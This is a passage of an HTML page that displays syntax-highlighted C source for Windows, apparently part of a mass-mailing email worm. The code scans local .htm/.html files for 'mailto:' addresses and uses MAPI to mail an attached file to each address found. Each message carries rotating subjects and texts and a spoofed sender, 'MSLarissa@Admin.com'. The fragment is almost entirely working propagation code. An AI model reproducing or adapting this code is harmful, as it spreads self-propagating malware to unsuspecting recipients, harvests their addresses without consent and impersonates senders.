  </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sto</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MAPI_TO</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">nRecipCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszPathName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fileName</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszFileName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fileNames</span><span class="sc10">[</span><span class="sc11">counting</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">nFileCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpOriginator</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpszNoteText</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">smes</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">(</span><span class="sc11">MSendMail</span><span class="sc10">)(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">mes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAPI_LOGON_UI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">wild</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">fh</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">fdata</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s\\*.ht*"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wild</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fdata</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s\\%s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wild</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fdata</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mail</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">mail</span><span class="sc10">)&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">subs</span><span class="sc10">[</span><span class="sc11">counting</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc6">"MSLarissa@Admin.com"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mail</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">texts</span><span class="sc10">[</span><span class="sc11">counting</span><span class="sc10">]);</span><span class="sc0">
      </span><span class="sc11">counting</span><span class="sc10">++;</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">counting</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">counting</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fdata</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mail</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">fd2</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mapped</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">test</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">valid</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">256</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">fd2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFileMapping</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PAGE_READONLY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">fd2</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">mapped</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">MapViewOfFile</span><span class="sc10">(</span><span class="sc11">fd2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_MAP_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mapped</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">test</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">strncmpi</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mapped</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">)))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">test</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">34</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">39</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">127</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">' '</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
          </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">valid</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
